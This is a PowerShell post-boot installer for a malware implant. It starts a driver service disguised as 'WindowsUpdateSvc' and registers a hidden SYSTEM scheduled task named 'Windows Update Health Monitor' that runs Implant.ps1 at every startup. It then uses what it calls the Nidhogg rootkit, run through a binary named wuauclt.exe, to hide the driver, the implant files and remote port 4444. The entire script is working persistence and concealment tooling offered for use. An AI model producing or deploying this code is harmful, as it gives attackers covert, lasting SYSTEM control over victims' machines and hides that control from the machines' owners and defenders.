# Install_Implant_PostBoot.ps1
$AppDir = "C:\Windows\System32\WindowsModulesAssistant"

Write-Host "[+] Post-Boot Configuration Running..." -ForegroundColor Cyan

if (-not (Test-Path "$AppDir\Implant.ps1")) {
    Write-Host "[-] Implant.ps1 not found in $AppDir." -ForegroundColor Red
    exit
}

# 1. Start Driver
sc.exe start "WindowsUpdateSvc" | Out-Null
Start-Sleep -Seconds 2

# 2. Persistence Task pointing to the WindowsModulesAssistant folder
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File $AppDir\Implant.ps1"

$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "Windows Update Health Monitor" `
    -Action $action -Trigger $trigger -Principal $principal -Force

# Start task immediately so you don't need a second reboot
Start-ScheduledTask -TaskName "Windows Update Health Monitor"
Write-Host "[+] Scheduled task registered and started" -ForegroundColor Green

# 3. Apply Nidhogg protections targeting the new folder
$n = "$AppDir\wuauclt.exe"
if (Test-Path $n) {
    & $n driver hide "C:\Windows\System32\drivers\Nidhogg.sys"
    & $n file hide "$AppDir\Implant.ps1"
    & $n file hide "$AppDir\wuauclt.exe"
    & $n port hide 4444 tcp remote
    Write-Host "[+] Nidhogg rootkit protections applied" -ForegroundColor Green
}

Write-Host "`n=== Post-Boot Installation Complete ===" -ForegroundColor Green